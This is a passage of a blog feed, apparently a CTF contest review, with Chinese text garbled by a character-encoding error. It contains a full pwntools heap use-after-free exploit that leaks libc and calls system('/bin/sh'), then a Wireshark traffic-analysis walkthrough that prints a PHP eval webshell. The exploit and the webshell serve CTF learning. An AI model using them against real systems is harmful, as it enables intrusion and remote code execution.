class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./note'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/home/assassinq/Desktop/pwn/heap/AHB-note/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'101.71.29.5'</span>, <span class="number">10001</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/home/assassinq/Desktop/pwn/heap/AHB-note/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">gdb.attach(p, a)</span><br><span class="line"><span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, con)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note size :'</span>)</span><br><span class="line">p.send(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">p.send(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">p.send(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.send(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">p.send(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'A'</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'B'</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'C'</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d('b *0x08048691\nc')</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>, p32(<span class="number">0x804865B</span>) + p32(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"content :"</span>)</span><br><span class="line">leak = p.recv(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u32(leak) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.info(<span class="string">"libc_base:0x%x"</span> % libc.address)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>, p32(libc.symbols[<span class="string">'system'</span>]) + p32(libc.search(<span class="string">'/bin/sh'</span>).next()))</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å…ˆç”³è¯·ä¸‰ä¸ªnoteï¼Œmallocäº†6ä¸ªchunkï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;A&apos; 0x10 byte + size + 0x10 byte</span><br><span class="line">&apos;B&apos; 0x10 byte + size + 0x10 byte</span><br><span class="line">&apos;C&apos; 0x10 byte + size + 0x10 byte</span><br></pre></td></tr></table></figure><p>å†freeæ‰ä¸¤ä¸ªnoteï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head --&gt; &apos;A&apos; 0x10 --&gt; &apos;B&apos; 0x10</span><br></pre></td></tr></table></figure><p>ç„¶åå†ç”³è¯·ä¸€ä¸ªnoteï¼Œä¹Ÿå°±æ˜¯æŠŠä¹‹å‰å·²ç»freeäº†çš„chunké‡æ–°åˆ†é…å›æ¥äº†ï¼Œå¯ä»¥leakå‡ºlibcåœ°å€ã€‚æœ€åå†ä¼ªé€ ä¸€ä¸ªfake noteï¼Œshowçš„æ—¶å€™å°±è°ƒç”¨äº†systemï¼ŒæˆåŠŸgetshellã€‚</p><h1 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h1><p>ç›¸å¯¹ç³»ç»Ÿåœ°å­¦ä¹ äº†ä¸€ä¸‹wiresharkçš„ä½¿ç”¨å’Œæµé‡åˆ†æã€‚</p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><ul><li>è¿‡æ»¤IPï¼š<ul><li><code>ip.src eq x.x.x.x or ip.dst eq x.x.x.x</code></li><li><code>ip.addr eq x.x.x.x</code></li></ul></li><li>è¿‡æ»¤ç«¯å£ï¼š<ul><li><code>tcp.port eq 80 or udp.port eq 80</code></li></ul></li><li>è¿‡æ»¤MAC<ul><li><code>eth.dst == A0:00:00:04:C5:84</code></li></ul></li><li>httpæ¨¡å¼è¿‡æ»¤ï¼š<ul><li><code>http.request.method == &quot;GET&quot;</code></li><li><code>http.request.method == &quot;POST&quot;</code></li><li><code>http.request.uri == &quot;/img/logo-edu.gif&quot;</code></li><li><code>http contains &quot;GET&quot;</code></li><li><code>http contains &quot;HTTP/1.&quot;</code></li><li><code>http.request.method == &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</code></li></ul></li></ul><h2 id="webone-pcap"><a href="#webone-pcap" class="headerlink" title="webone.pcap"></a>webone.pcap</h2><p>åè®®åˆ†çº§å‘ç°å¤§éƒ¨åˆ†ä¸ºhttpï¼Œé‡ç‚¹å…³æ³¨å¯¹è¯çš„80ç«¯å£ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šé»‘å®¢çš„åœ°å€ã€‚</p><ol><li>é»‘å®¢ä½¿ç”¨çš„æ‰«æå™¨</li></ol><p>æ‰«æå™¨å¾ˆå®¹æ˜“å‘ç°ï¼š</p><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/1.png" alt="awvs"></p><p>æˆ–è€…å¯ä»¥ç”¨<code>http contains</code>æŸ¥æ‰¾å¸¸ç”¨çš„å‡ ç§æ‰«æå™¨ã€‚</p><ol start="2"><li>é»‘å®¢æ‰«æåˆ°çš„ç™»é™†åå°</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure><p>å¾—çŸ¥é»‘å®¢ä½¿ç”¨äº†awvsåå†æ¬¡ç­›é€‰å¯ä»¥æ‰¾åˆ°ç™»å½•åå°ï¼š</p><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/2.png" alt="ç™»é™†åå°"></p><ol start="3"><li>é»‘å®¢ç™»é™†webåå°ä½¿ç”¨çš„è´¦å·å¯†ç </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;rec=login&quot;</span><br></pre></td></tr></table></figure><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/3.png" alt="è¿‡æ»¤å¾—åˆ°ç»“æœ"></p><ol start="4"><li>é»‘å®¢ä¸Šä¼ çš„webshellå†…å®¹çš„baseç¼–ç </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot; and ip.src == 192.168.94.59 and http contains &quot;eval&quot;</span><br></pre></td></tr></table></figure><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/4.png" alt="æ‰¾åˆ°çš„webshell"></p><p>å³å°†<code>@eval($_POST[&#39;1234&#39;])</code>base64åŠ å¯†åæäº¤ã€‚</p><ol start="5"><li>é»‘å®¢åœ¨robots.txtä¸­æ‰¾åˆ°çš„flag</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;Disallow&quot;</span><br></pre></td></tr></table></figure><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/5.png" alt="flag"></p><ol start="6"><li>é»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;web&quot; and http contains &quot;password&quot;</span><br></pre></td></tr></table></figure><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/6.png" alt="æ‰¾åˆ°çš„å¯†ç "></p><ol start="7"><li>è¢«é»‘å®¢æ”»å‡»çš„webæœåŠ¡å™¨ç½‘å¡å†…ç½‘ip</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;eth&quot;</span><br></pre></td></tr></table></figure><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/7.png" alt="ç½‘å¡å†…ç½‘ip"></p><h2 id="webtwo-pcap"><a href="#webtwo-pcap" class="headerlink" title="webtwo.pcap"></a>webtwo.pcap</h2><ol><li>é»‘å®¢åœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°çš„hash_code</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql contains &quot;hash_code&quot;</span><br></pre></td></tr></table></figure><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/8.png" alt="hash_code"></p><ol start="2"><li>é»‘å®¢ç ´è§£è´¦å·<a href="mailto:ijnu@test.com" target="_blank" rel="noopener">ijnu@test.com</a>å¾—åˆ°çš„å¯†ç </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql contains &quot;ijnu@test.com&quot;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°å¯†ç åmd5è§£å¯†ï¼š</p><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/9.png" alt="å¯†ç æ˜æ–‡"></p><h2 id="mailtwo-pcap-amp-amp-mailtwo1-pcap"><a href="#mailtwo-pcap-amp-amp-mailtwo1-pcap" class="headerlink" title="mailtwo.pcap &amp;&amp; mailtwo1.pcap"></a>mailtwo.pcap &amp;&amp; mailtwo1.pcap</h2><ol><li>é»‘å®¢ç™»é™†mailç³»ç»Ÿä½¿ç”¨çš„è´¦å·</li></ol><p>å¯ä»¥ç¤¾å·¥ï¼Œç›´æ¥ç”¨webçš„è´¦å·å¯†ç ã€‚</p><p>æ­£ç»åšæ³•æ˜¯å…ˆåœ¨mailtwo.pcapä¸­æ‰¾åˆ°åŠ å¯†ç®—æ³•ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> key_hash = CryptoJS.MD5(<span class="string">'1234567812345678'</span>);</span><br><span class="line"><span class="keyword">var</span> key = CryptoJS.enc.Utf8.parse(key_hash);</span><br><span class="line"><span class="keyword">var</span> iv  = CryptoJS.enc.Utf8.parse(<span class="string">'1234567812345678'</span>);</span><br><span class="line">form.password.value = CryptoJS.AES.encrypt(form.password.value, key, &#123; <span class="attr">iv</span>: iv,<span class="attr">mode</span>:CryptoJS.mode.CBC,<span class="attr">padding</span>:CryptoJS.pad.ZeroPadding&#125;)</span><br></pre></td></tr></table></figure><p>åœ¨mailtwo1.pcapä¸­å†è¿‡æ»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(http contains &quot;&#123;\&quot;success\&quot;:true&#125;&quot; or http.request.method == &quot;POST&quot;) and ip.addr == 192.168.94.59</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°è¢«åŠ å¯†çš„å¯†ç ï¼š</p><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/10.png" alt="å¯†ç "></p><p>æœ€åæ ¹æ®ç®—æ³•å’Œå·²è¢«åŠ å¯†çš„å¯†ç å¾—åˆ°æ˜æ–‡å¯†ç ã€‚</p><h2 id="vpnone-pcap-amp-amp-vpntwo-pcap"><a href="#vpnone-pcap-amp-amp-vpntwo-pcap" class="headerlink" title="vpnone.pcap &amp;&amp; vpntwo.pcap"></a>vpnone.pcap &amp;&amp; vpntwo.pcap</h2><p>vpnone.pcapåœ¨å°è¯•ç™»é™†vpnï¼Œvpntwo.pcapæˆåŠŸç™»é™†äº†vpnã€‚</p><ol><li>é»‘å®¢è·å¾—çš„vpnã€ip</li></ol><p>åœ¨<code>ç»Ÿè®¡-&gt;ç«¯ç‚¹</code>ä¸­æµé‡æœ€å¤§çš„ä¸ºé»‘å®¢ipã€‚</p><p><img src="/pics/2018-å®‰æ’æ¯å…«æœˆæœˆèµ›-review/æµé‡åˆ†æ/11.png" alt="å¯èƒ½çš„é»‘å®¢ip"></p><p>å‚è€ƒç½‘ç«™ï¼š</p><p><a href="http://foreversong.cn/archives/216" target="_blank" rel="noopener">http://foreversong.cn/archives/216</a><br><a href="http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/" target="_blank" rel="noopener">http://skysec.top/2018/08/25/2018%E5%AE%89%E6%81%928%E6%9C%88%E8%B5%9BWriteup/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ”¾æš‘å‡ç©äº†å‡ å¤©ï¼Œæ…¢æ…¢æ•´ç†è¿™å‡ æ¬¡æ¯”èµ›ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="review" scheme="https://qianfei11.github.io/tags/review/"/>
    
  </entry>
  
</feed>
